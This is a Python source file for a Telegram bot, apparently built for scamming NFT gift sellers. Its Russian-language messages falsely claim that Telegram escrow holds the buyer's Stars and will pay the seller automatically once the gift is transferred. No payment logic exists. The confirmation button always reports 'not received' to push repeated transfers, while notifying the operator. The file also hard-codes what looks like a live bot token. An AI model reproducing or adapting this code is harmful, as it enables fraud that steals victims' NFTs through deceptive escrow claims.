# bot_inline.py — NFT Deal Bot | Inline Mode | aiogram 3.31+
import asyncio
import logging
import random
import re
import sqlite3
import string
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, CommandObject
from aiogram.types import (
    CallbackQuery, InlineKeyboardButton, Message,
    LinkPreviewOptions, InlineQueryResultArticle,
    InputTextMessageContent, InlineQuery
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

TOKEN    = "8943957778:AAG5xldmNI0M9sd-lXUk6LeYY8XuN4cgYY8"
ADMIN_ID = 8926402887

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp  = Dispatcher()

# ── БД ───────────────────────────────────────────────────────
db = sqlite3.connect("deals.db", check_same_thread=False)
db.row_factory = sqlite3.Row
db.executescript("""
CREATE TABLE IF NOT EXISTS deals (
    order_id        TEXT PRIMARY KEY,
    buyer_username  TEXT,
    chat_id         INTEGER,
    nft_url         TEXT,
    nft_slug        TEXT,
    nft_num         TEXT,
    amount          INTEGER,
    status          TEXT DEFAULT 'offer',
    created_at      TEXT,
    offer_msg_id    INTEGER,
    sent_at         TEXT
);
CREATE TABLE IF NOT EXISTS allowed_users (
    user_id         INTEGER PRIMARY KEY
);
CREATE TABLE IF NOT EXISTS allowed_usernames (
    username        TEXT PRIMARY KEY
);
CREATE TABLE IF NOT EXISTS pending_offers (
    order_id        TEXT PRIMARY KEY,
    buyer_id        INTEGER,
    buyer_username  TEXT,
    nft_url         TEXT,
    nft_slug        TEXT,
    nft_num         TEXT,
    amount          INTEGER,
    created_at      TEXT
);
""")
db.commit()


def gen_order_id() -> str:
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

def parse_nft(url: str):
    m = re.match(r"https?://t\.me/nft/([A-Za-z]+)-(\d+)", url)
    return (m.group(1), m.group(2)) if m else (None, None)

def get_deal(order_id: str) -> dict | None:
    row = db.execute("SELECT * FROM deals WHERE order_id=?", (order_id,)).fetchone()
    return dict(row) if row else None

def get_pending(order_id: str) -> dict | None:
    row = db.execute("SELECT * FROM pending_offers WHERE order_id=?", (order_id,)).fetchone()
    return dict(row) if row else None

def upd(order_id: str, **kw):
    for k, v in kw.items():
        db.execute(f"UPDATE deals SET {k}=? WHERE order_id=?", (v, order_id))
    db.commit()

def fmt_remaining(sent_at_str: str) -> str:
    sent_at   = datetime.fromisoformat(sent_at_str)
    deadline  = sent_at + timedelta(hours=6)
    remaining = deadline - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0 ч. 0 мин."
    total_min = int(remaining.total_seconds() // 60)
    h, m = divmod(total_min, 60)
    return f"{h} ч. {m} мин."

def is_allowed(user_id: int, username: str = None) -> bool:
    if user_id == ADMIN_ID:
        return True
    row = db.execute("SELECT 1 FROM allowed_users WHERE user_id=?", (user_id,)).fetchone()
    if row:
        return True
    if username:
        uname = username.lstrip("@").lower()
        row2 = db.execute("SELECT 1 FROM allowed_usernames WHERE username=?", (uname,)).fetchone()
        if row2:
            return True
    return False

def add_user(value: str):
    value = value.strip()
    if value.lstrip("@").isdigit():
        db.execute("INSERT OR IGNORE INTO allowed_users (user_id) VALUES (?)", (int(value.lstrip("@")),))
    else:
        db.execute("INSERT OR IGNORE INTO allowed_usernames (username) VALUES (?)", (value.lstrip("@").lower(),))
    db.commit()

def remove_user(value: str):
    value = value.strip()
    if value.lstrip("@").isdigit():
        db.execute("DELETE FROM allowed_users WHERE user_id=?", (int(value.lstrip("@")),))
    else:
        db.execute("DELETE FROM allowed_usernames WHERE username=?", (value.lstrip("@").lower(),))
    db.commit()


# ── Тексты ───────────────────────────────────────────────────
def offer_text(p: dict, sent_at: str) -> str:
    return (
        f"Пользователь предлагает вам "
        f"<b>{p['amount']:,} Звёзд</b> за подарок "
        f"<a href=\"{p['nft_url']}\">{p['nft_slug']} #{p['nft_num']}</a>.\n\n"
        f"Оффер действителен ещё <b>{fmt_remaining(sent_at)}</b>"
    )

def deal_text(d: dict) -> str:
    return (
        f"Ордер <b>#{d['order_id']}</b>\n\n"
        f"Покупатель зарезервировал <b>{d['amount']:,} ⭐️ Звёзд</b> через эскроу-систему "
        f"Telegram. Средства хранятся на специальном эскроу-счёте и будут автоматически "
        f"зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
        f"<b>Инструкция для завершения сделки:</b>\n"
        f"1. Передайте подарок пользователю: @{d['buyer_username']}\n"
        f"2. Нажмите «Передать NFT» и выберите <a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a>\n"
        f"3. Подтвердите передачу подарка.\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит "
        f"<b>{d['amount']:,} ⭐️ Звёзд</b> на ваш баланс. Резерв действует 24 часа."
    )


# ── Клавиатуры ───────────────────────────────────────────────
def offer_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{order_id}"),
        InlineKeyboardButton(text="Принять",   callback_data=f"accept:{order_id}")
    )
    return kb.as_markup()

def deal_kb(d: dict):
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(
        text="Передать NFT ↗",
        url=f"tg://send_gift?to={d['buyer_username']}"
    ))
    kb.row(InlineKeyboardButton(
        text="Подтвердить передачу",
        callback_data=f"confirm:{d['order_id']}"
    ))
    return kb.as_markup()

def admin_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="Подтвердить", callback_data=f"adm_ok:{order_id}"),
        InlineKeyboardButton(text="Не передан",  callback_data=f"adm_no:{order_id}")
    )
    return kb.as_markup()


# ── Таймер ───────────────────────────────────────────────────
async def offer_timer(order_id: str, chat_id: int, msg_id: int, sent_at: str):
    while True:
        await asyncio.sleep(60)
        d = get_deal(order_id)
        if not d or d['status'] != 'offer':
            break
        deadline = datetime.fromisoformat(sent_at) + timedelta(hours=6)
        if datetime.now() >= deadline:
            upd(order_id, status='expired')
            try:
                await bot.edit_message_text(
                    "Оффер истёк.",
                    chat_id=chat_id,
                    message_id=msg_id,
                    reply_markup=None
                )
            except Exception:
                pass
            break
        p = get_pending(order_id)
        if not p:
            break
        try:
            await bot.edit_message_text(
                offer_text(p, sent_at),
                chat_id=chat_id,
                message_id=msg_id,
                reply_markup=offer_kb(order_id),
                link_preview_options=LinkPreviewOptions(
                    url=p['nft_url'],
                    show_above_text=True,
                    prefer_large_media=True
                )
            )
        except Exception:
            pass


# ── /start ───────────────────────────────────────────────────
@dp.message(CommandStart())
async def cmd_start(message: Message, command: CommandObject):
    uid = message.from_user.id
    if uid == ADMIN_ID:
        await message.answer("👋 Админ")
        return
    await message.answer(
        "👋 Добро пожаловать!\n\n"
        "Данный бот создан для оформления офферов в Telegram. "
        "С его помощью вы можете безопасно совершать сделки по передаче NFT-подарков.\n\n"
        "Если вам поступил оффер через этот бот — нажмите «Принять» или «Отклонить» на сообщении с предложением."
    )


# ── /add /remove /users ───────────────────────────────────────
@dp.message(F.text.startswith("/add "))
async def cmd_add(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    val = message.text.split()[1]
    add_user(val)
    await message.answer(f"✅ Доступ выдан: {val}")

@dp.message(F.text.startswith("/remove "))
async def cmd_remove(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    val = message.text.split()[1]
    remove_user(val)
    await message.answer(f"✅ Доступ забран: {val}")

@dp.message(F.text == "/users")
async def cmd_users(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    ids   = db.execute("SELECT user_id FROM allowed_users").fetchall()
    names = db.execute("SELECT username FROM allowed_usernames").fetchall()
    if not ids and not names:
        await message.answer("Список пуст.")
        return
    lines = [str(r['user_id']) for r in ids] + ["@" + r['username'] for r in names]
    await message.answer("С доступом:\n" + "\n".join(lines))


# ── .buy — создаём pending оффер и даём кнопку отправки ──────
@dp.message(F.text.regexp(r"^https?://t\.me/nft/\S+\s+\d+"))
async def cmd_buy(message: Message):
    uid = message.from_user.id
    if not is_allowed(uid, message.from_user.username):
        await message.answer("Бот недоступен.")
        return

    parts   = message.text.strip().split()
    nft_url = parts[0]
    amount  = int(parts[1])

    slug, num = parse_nft(nft_url)
    if not slug:
        await message.answer("❌ Неверная ссылка.")
        return

    order_id       = gen_order_id()
    buyer_username = message.from_user.username or str(uid)

    db.execute("""
        INSERT INTO pending_offers
          (order_id, buyer_id, buyer_username, nft_url, nft_slug, nft_num, amount, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    """, (order_id, uid, buyer_username, nft_url, slug, num, amount, datetime.now().isoformat()))
    db.commit()

    # кнопка для отправки инлайн оффера в любой чат
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(
        text="📤 Отправить оффер продавцу",
        switch_inline_query=order_id
    ))

    await message.answer(
        f"✅ Оффер готов\n\n"
        f"NFT: <b>{slug} #{num}</b>\n"
        f"Сумма: <b>{amount:,} ⭐️</b>\n\n"
        f"Нажми кнопку ниже и выбери чат продавца:",
        reply_markup=kb.as_markup()
    )


# ── Инлайн запрос — продавец видит карточку оффера ───────────
@dp.inline_query()
async def inline_offer(query: InlineQuery):
    order_id = query.query.strip()
    if not order_id:
        await query.answer([], cache_time=1)
        return

    p = get_pending(order_id)
    if not p:
        await query.answer([], cache_time=1)
        return

    sent_at = datetime.now().isoformat()

    result = InlineQueryResultArticle(
        id=order_id,
        title=f"{p['nft_slug']} #{p['nft_num']} — {p['amount']:,} ⭐️",
        description="Нажми чтобы отправить оффер",
        input_message_content=InputTextMessageContent(
            message_text=offer_text(p, sent_at),
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(
                url=p['nft_url'],
                show_above_text=True,
                prefer_large_media=True
            )
        ),
        reply_markup=offer_kb(order_id)
    )

    await query.answer([result], cache_time=1, is_personal=True)


# ── Chosen inline result — оффер отправлен, запускаем таймер ─
@dp.chosen_inline_result()
async def on_chosen(chosen):
    order_id = chosen.result_id
    p = get_pending(order_id)
    if not p:
        return

    sent_at = datetime.now().isoformat()

    # сохраняем сделку
    db.execute("""
        INSERT OR IGNORE INTO deals
          (order_id, buyer_username, chat_id, nft_url, nft_slug, nft_num,
           amount, status, created_at, sent_at)
        VALUES (?, ?, 0, ?, ?, ?, ?, 'offer', ?, ?)
    """, (order_id, p['buyer_username'], p['nft_url'], p['nft_slug'],
          p['nft_num'], p['amount'], sent_at, sent_at))
    db.commit()

    # для таймера нужен inline_message_id
    if chosen.inline_message_id:
        asyncio.create_task(
            offer_timer_inline(order_id, chosen.inline_message_id, sent_at, p)
        )

    # уведомляем тебя
    try:
        await bot.send_message(
            ADMIN_ID,
            f"📤 <b>Оффер отправлен</b>\n\n"
            f"Ордер: <b>{order_id}</b>\n"
            f"NFT: <b>{p['nft_slug']} #{p['nft_num']}</b>\n"
            f"Сумма: <b>{p['amount']:,} ⭐️</b>"
        )
    except Exception as e:
        logging.error(e)


async def offer_timer_inline(order_id: str, inline_msg_id: str, sent_at: str, p: dict):
    while True:
        await asyncio.sleep(60)
        d = get_deal(order_id)
        if not d or d['status'] != 'offer':
            break
        deadline = datetime.fromisoformat(sent_at) + timedelta(hours=6)
        if datetime.now() >= deadline:
            upd(order_id, status='expired')
            try:
                await bot.edit_message_text(
                    "Оффер истёк.",
                    inline_message_id=inline_msg_id,
                    reply_markup=None
                )
            except Exception:
                pass
            break
        try:
            await bot.edit_message_text(
                offer_text(p, sent_at),
                inline_message_id=inline_msg_id,
                reply_markup=offer_kb(order_id),
                link_preview_options=LinkPreviewOptions(
                    url=p['nft_url'],
                    show_above_text=True,
                    prefer_large_media=True
                )
            )
        except Exception:
            pass


# ── Принять ──────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("accept:"))
async def cb_accept(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    p = get_pending(order_id)
    src = d or p
    if not src or (d and d['status'] != 'offer'):
        await call.answer("Оффер недоступен.", show_alert=True)
        return

    if d:
        upd(order_id, status='active')
    else:
        # создаём deal из pending
        sent_at = datetime.now().isoformat()
        db.execute("""
            INSERT OR IGNORE INTO deals
              (order_id, buyer_username, chat_id, nft_url, nft_slug, nft_num,
               amount, status, created_at, sent_at)
            VALUES (?, ?, 0, ?, ?, ?, ?, 'active', ?, ?)
        """, (order_id, p['buyer_username'], p['nft_url'], p['nft_slug'],
              p['nft_num'], p['amount'], sent_at, sent_at))
        db.commit()

    src = get_deal(order_id)

    await call.answer(
        "Внимание!\n\n"
        "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
        "Нажмите «ОК», если вы прочитали это сообщение.",
        show_alert=True
    )

    try:
        if call.inline_message_id:
            await bot.edit_message_text(
                deal_text(src),
                inline_message_id=call.inline_message_id,
                reply_markup=deal_kb(src),
                link_preview_options=LinkPreviewOptions(
                    url=src['nft_url'],
                    show_above_text=True,
                    prefer_large_media=True
                )
            )
        else:
            await bot.edit_message_text(
                deal_text(src),
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=deal_kb(src),
                link_preview_options=LinkPreviewOptions(
                    url=src['nft_url'],
                    show_above_text=True,
                    prefer_large_media=True
                )
            )
    except Exception as e:
        logging.error(f"edit to deal: {e}")


# ── Отклонить ────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("decline:"))
async def cb_decline(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    p = get_pending(order_id)
    src = d or p
    if not src:
        return

    if d:
        upd(order_id, status='declined')

    await call.answer("Вы отклонили оффер.")

    nft_url  = src['nft_url']
    nft_slug = src['nft_slug']
    nft_num  = src['nft_num']

    try:
        if call.inline_message_id:
            await bot.edit_message_text(
                f"Оффер на NFT <a href=\"{nft_url}\">{nft_slug} #{nft_num}</a> отменён.",
                inline_message_id=call.inline_message_id,
                reply_markup=None,
                link_preview_options=LinkPreviewOptions(is_disabled=True)
            )
        else:
            await bot.edit_message_text(
                f"Оффер на NFT <a href=\"{nft_url}\">{nft_slug} #{nft_num}</a> отменён.",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=None,
                link_preview_options=LinkPreviewOptions(is_disabled=True)
            )
    except Exception as e:
        logging.error(e)


# ── Подтвердить передачу ─────────────────────────────────────
@dp.callback_query(F.data.startswith("confirm:"))
async def cb_confirm(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d or d['status'] != 'active':
        await call.answer("Ордер недоступен.", show_alert=True)
        return

    await call.answer(
        "Внимание!\n\nТовар не получен, попробуйте передать ещё раз и нажмите кнопку.",
        show_alert=True
    )

    try:
        await bot.send_message(
            ADMIN_ID,
            f"🔔 <b>Попытка подтверждения</b>\n\n"
            f"Ордер: <b>{d['order_id']}</b>\n"
            f"NFT: <b>{d['nft_slug']} #{d['nft_num']}</b>\n"
            f"Сумма: <b>{d['amount']:,} ⭐️</b>\n"
            f"Покупатель: @{d['buyer_username']}\n"
            f"Ссылка: {d['nft_url']}\n\n"
            f"Нажми если NFT реально передан:",
            reply_markup=admin_kb(order_id)
        )
    except Exception as e:
        logging.error(e)


# ── Админ: подтвердить ───────────────────────────────────────
@dp.callback_query(F.data.startswith("adm_ok:"))
async def cb_adm_ok(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return

    upd(order_id, status='completed')
    await call.answer("Подтверждено.")
    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.answer(f"✅ Ордер {order_id} завершён.")

    try:
        if d.get('offer_msg_id') and d.get('chat_id'):
            await bot.send_message(
                d['chat_id'],
                f"Передача подтверждена!\n\nОрдер <b>{d['order_id']}</b>\n"
                f"<b>{d['amount']:,} ⭐️ Звёзд</b> зачислены на ваш баланс."
            )
    except Exception as e:
        logging.error(e)


# ── Админ: не передан ────────────────────────────────────────
@dp.callback_query(F.data.startswith("adm_no:"))
async def cb_adm_no(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return

    upd(order_id, status='active')
    await call.answer("Отклонено.")
    await call.message.edit_reply_markup(reply_markup=None)


# ── catch all ────────────────────────────────────────────────
@dp.message()
async def catch_all(message: Message):
    if message.from_user.id == ADMIN_ID:
        return
    if not is_allowed(message.from_user.id, message.from_user.username):
        await message.answer("Бот недоступен.")


async def main():
    logging.basicConfig(level=logging.INFO)
    from aiogram.types import BotCommand
    await bot.set_my_commands([BotCommand(command="start", description="Запустить")])
    await dp.start_polling(
        bot,
        skip_updates=True,
        allowed_updates=["message", "callback_query", "inline_query", "chosen_inline_result"]
    )

if __name__ == "__main__":
    asyncio.run(main())
